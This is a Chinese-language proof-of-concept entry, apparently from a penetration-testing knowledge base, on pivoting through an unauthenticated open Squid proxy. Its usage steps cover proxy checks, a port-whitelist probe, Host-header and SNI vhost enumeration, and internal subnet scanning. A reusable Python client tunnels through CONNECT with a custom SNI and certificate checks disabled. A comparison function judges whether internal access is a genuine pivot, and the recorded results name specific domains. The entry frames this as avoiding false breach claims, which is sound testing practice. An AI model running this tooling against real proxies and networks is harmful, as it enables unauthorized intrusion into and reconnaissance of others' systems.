# 开放代理“穿内网”真伪判定法：内网 vs 公网同 SNI 对照 body hash（附 CONNECT+自定义SNI 手法）

- **code**: 开放代理-穿内网-真伪判定法-内网-vs-公网同-sni-对照-body-hash-附-connect-自定义sni-手法
- **kind**: script
- **category**: tunnel
- **component**: Squid / nginx SNI 路由
- **versions**: 通用
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.51:5566（未授权开放 Squid，出口即该机）实测完整链路：① 代理可用 curl -x http://203.0.113.51:5566 http://ifconfig.me/ip → 200 返回 203.0.113.51；② 端口白名单只放 80/443（其余 403 ERR_ACCESS_DENIED）；③ 经 CONNECT 到 203.0.113.42:443/203.0.113.43:443 时裸 IP SNI 全部 TLSV1_UNRECOGNIZED_NAME（证明 nginx 有 SNI 路由且无默认证书），用自定义 SNI 后 130 条域名枚举中 6 条命中（newapi.aiopus.org / api.xqtd520qidong.com → New API rc.22；aiapi.aiopus.org → 自研中转站 21114B）；④ 关键对照：同一 SNI 下 内网(经 Squid→203.0.113.42:443) 与 公网直连(203.0.113.51:443) 的 status 与 body sha256 **完全一致**（三个域名全等价）⇒ 172.x 网关就是宿主机自身 nginx，**无任何内网独占服务**，不构成内网突破；⑤ 80 端口侧 148 条 Host 头枚举全部返回同一条 130B nginx 404（无 vhost）；172.17.0.0/24 与 172.18.0.0/24 全段扫描除 .1 外全部无服务（Squid 503）；172.19/172.20/172.26 段不可达。最终判定：该开放代理可换出口，但**不可用于进入隔离内网**，不计边界突破分。
- **path**: pocs/开放代理-穿内网-真伪判定法-内网-vs-公网同-sni-对照-body-hash-附-connect-自定义sni-手法/poc.py
- **tags**: squid,开放代理,内网突破,boundary,SNI,vhost,对照实验,判据,CONNECT
- **created_at**: 2026-09-30T01:28:31.389Z

## 描述

拿到一个未授权开放代理后，不要凭“能访问 172.x 地址”就断言完成内网突破。203.0.113.42/203.0.113.43 是 Docker 网桥网关=宿主机自己，经它访问等于访问宿主机自身服务。必须做“同 SNI / 同 Host 下 内网入口 vs 公网入口的响应对照（含 body sha256）”：一致 ⇒ 无内网独占面、不算突破；不一致或内网能拿到公网拿不到的服务 ⇒ 才算。本文给出可复用的 CONNECT+自定义 SNI 客户端与判定脚本。

## 用法

```
1) 代理可用性：curl -x http://PROXY:5566 http://ifconfig.me/ip（回显 == 目标 IP 即匿名可用）。
2) 端口白名单探测：80 与 443 通常放行，其余返回 Squid 403 ERR_ACCESS_DENIED；503 ERR_CONNECT_FAIL = 放行但目标无服务。
3) 裸 IP 访问 https 会得到 TLSV1_UNRECOGNIZED_NAME ⇒ 说明有 SNI 路由，必须带域名握手（见 content 里的 conn_sni()）。
4) vhost 枚举：80 端口用 Host 头（基线 = nginx 默认 404 长度，本例 130B）；443 端口用 CONNECT+自定义 SNI（SSLError = 无该 vhost，非 404 = 命中）。
5) **必做对照**（决定性判据）：同一 SNI 分别经 内网入口 与 公网源站 IP 各取一次，比较 status + sha256(body)。一致 ⇒ 不算内网突破；不一致 ⇒ 再深挖差异。
6) 网段排除：全段扫 80（跳过 Squid 自身 3058~3062B 的 503 错误页），确认除网关外是否还有容器；172.17/172.18 之外的 172.19/172.20/172.26 若全超时即路由不可达。
```

## 正文

```
# 可复用：经 HTTP 代理建立 CONNECT 隧道 + 自定义 SNI 取目标响应
import socket, ssl, hashlib

PROXY = ("PROXY_HOST", 5566)

def conn_sni(target_ip, port, sni, path="/", timeout=15):
    """经 Squid CONNECT 到 target_ip:port，用指定 SNI 完成 TLS 握手并发 GET"""
    s = socket.create_connection(PROXY, timeout=timeout)
    s.sendall(("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n"
               % (target_ip, port, target_ip, port)).encode())
    resp = b""; s.settimeout(timeout)
    while b"\r\n\r\n" not in resp:
        c = s.recv(4096)
        if not c: break
        resp += c
    if b" 200 " not in resp.split(b"\r\n")[0]:
        raise RuntimeError("CONNECT rejected: " + resp.split(b"\r\n")[0].decode())
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ss = ctx.wrap_socket(s, server_hostname=sni)          # ← 关键：SNI 决定 nginx 选哪个 vhost
    ss.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
                "Connection: close\r\n\r\n" % (path, sni)).encode())
    data = b""
    while True:
        c = ss.recv(16384)
        if not c: break
        data += c
    ss.close()
    head, _, body = data.partition(b"\r\n\r\n")
    return head.decode("utf-8", "replace").split("\r\n")[0], body

# 判定内网是否真有独占面（决定性）
def is_real_intranet_pivot(sni, internal_ip="203.0.113.42", public_ip="TARGET_PUBLIC_IP"):
    st1, b1 = conn_sni(internal_ip, 443, sni)
    st2, b2 = conn_sni(public_ip, 443, sni)       # 注意：public 侧也走同样的 SNI
    same = (st1 == st2) and (hashlib.sha256(b1).hexdigest() == hashlib.sha256(b2).hexdigest())
    return same, st1, len(b1), st2, len(b2)
# same=True  -> 内网入口只是宿主机自身 nginx，无内网独占服务，不算边界突破
# same=False -> 存在差异，继续挖差异点

# 本例实测（203.0.113.51）：
#   newapi.aiopus.org        : 内网 200/1166 sha 65d8428308fd41cf == 公网 200/1166 sha 65d8428308fd41cf
#   api.xqtd520qidong.com    : 同上（同一 New API 实例）
#   aiapi.aiopus.org         : 内网 200/21114 sha 56c5e28a85ae88fa == 公网 200/21114 sha 56c5e28a85ae88fa
#   ⇒ 三例全等价 ⇒ 判定“无内网独占面”。

```
